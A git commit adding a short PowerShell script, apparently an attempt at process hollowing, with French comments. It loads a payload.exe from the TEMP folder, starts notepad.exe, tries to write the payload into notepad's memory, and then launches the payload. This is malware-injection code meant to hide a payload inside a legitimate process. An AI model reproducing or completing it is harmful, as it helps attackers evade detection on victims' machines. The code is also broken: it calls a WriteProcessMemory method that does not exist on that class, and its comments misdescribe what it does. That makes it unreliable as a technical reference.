f1f0ea5c0787eba57b175f968d405bb83835791f
Nadir77500 <145572001+Nadir77500@users.noreply.github.com>
2025-02-01 23:13:42 +0100

    Add files via upload

---
+++ process_hollowing.ps1
@@ -0,0 +1,18 @@
+﻿# Télécharger le payload dans la mémoire
+$payloadPath = "$env:TEMP\payload.exe"
+$payloadBytes = [System.IO.File]::ReadAllBytes($payloadPath)
+
+# Démarrer le processus cible (notepad.exe)
+$process = Start-Process -PassThru -FilePath "notepad.exe"
+Start-Sleep -Seconds 2
+
+# Récupérer le handle du processus
+$hProcess = [System.Diagnostics.Process]::GetProcessesByName('notepad')[0].Handle
+
+# Allouer de la mémoire dans le processus cible
+$allocMem = [System.Diagnostics.Process]::GetProcessesByName('notepad')[0].MainModule.BaseAddress
+$ptr = [System.IntPtr]::Zero
+[System.Diagnostics.Process]::WriteProcessMemory($hProcess, $allocMem, $payloadBytes, $payloadBytes.Length, $ptr)
+
+# Lancer le payload en mémoire
+[System.Diagnostics.Process]::Start($payloadPath)
